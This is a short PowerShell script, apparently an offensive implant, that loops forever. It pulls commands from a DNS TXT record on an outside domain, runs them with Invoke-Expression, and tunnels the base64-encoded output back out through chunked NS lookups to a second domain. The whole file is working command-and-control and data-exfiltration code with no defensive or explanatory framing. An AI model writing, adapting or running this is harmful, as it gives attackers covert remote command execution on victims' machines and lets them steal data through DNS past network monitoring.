while ($True){
    sleep 2
	
	$tunnel="tunnelsubdomain.domain.net"
	$cmd_txt_dns="command.domain.net"
	
    $cmd123 =  ((nslookup -type=txt $cmd_txt_dns) -split '"')[6]
    #Write-Host $cmd123

    If (-not($cmd123 -contains "beep beep")) {
        

        $post_cmd = Invoke-Expression $cmd123 | Out-String
        $cmd_base64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($post_cmd))
        
        $b64_array=@()
        $b64_array+= $cmd_base64 -split '(\w{50})' | ? {$_}
        $counter=0
        $Var=$b64_array.Length.ToString() + 'Gr3at3stRaPP3rEvA.'+$tunnel
        $blah = nslookup -type=NS -timeout=1 $Var
        $Var='wh0d01t'+'.'+$tunnel
        
        $blah = nslookup -type=NS -timeout=1 $Var
        $counter=$b64_array.Length
        foreach ($i in $b64_array) {
            $Var=$counter.ToString()+'a999'+$i+'.'+$tunnel
            $blah = nslookup -type=NS -timeout=1 $Var
            #write-host $Var.Length
            #write-host $Var
            $counter--



        }
        
        $Var='13a114lfe'+'.'+$tunnel
        $blah = nslookup -type=NS -timeout=1 $Var
        sleep 10
        }
    Else {
        $Var='13ac0n'+'.'+$tunnel
        $bacon=nslookup -type=NS -timeout=1 $Var
        sleep 5
         }
}
 
